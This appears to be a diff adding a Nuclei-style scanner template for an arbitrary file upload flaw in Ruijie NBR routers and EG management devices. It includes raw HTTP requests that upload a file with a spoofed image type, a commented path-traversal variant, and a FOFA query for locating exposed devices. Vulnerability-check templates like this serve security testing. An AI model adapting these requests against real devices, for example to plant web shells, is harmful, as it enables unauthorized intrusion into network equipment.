@@ -1,0 +1,54 @@
+id: ruijie-eg-and-nbr-ddi-server-fileupload-fileupload
+
+info:
+  name:  锐捷NBR路由器、锐捷EG易网管/ddi/server/fileupload.php任意文件上传
+  author: xy
+  severity: high
+  reference:
+    - none
+  tags: ruijie,fileuplod
+  metadata:
+    veified: true
+    fofa-query: fid="BcZWN696xewWLAncU/0IiA=="
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=---------------------------377854284742296314544091742118
+
+        -----------------------------377854284742296314544091742118
+        Content-Disposition: form-data; name="uploadDir"
+
+        upload
+        -----------------------------377854284742296314544091742118
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.txt"
+        Content-Type: image/png
+
+        {{randstr}}
+        -----------------------------377854284742296314544091742118--
+
+      - |
+        GET /ddi/server/upload/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), 'jsonrpc')"
+          - "status_code_2 == 200 && contains((body_2), '{{randstr}}')"
+        condition: and
+
+# 第二种
+# POST /ddi/server/fileupload.php?uploadDir=../../upload&name=cnvd.txt HTTP/1.1
+# Host: {{Hostname}}
+# Accept: text/plain, */*; q=0.01
+# User-Agent: Moziilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+# Content-Disposition: form-data; name="file"; filename="cnvd.txt"
+# Content-Type: image/jpeg
+
+# www.cnvd.org.cn
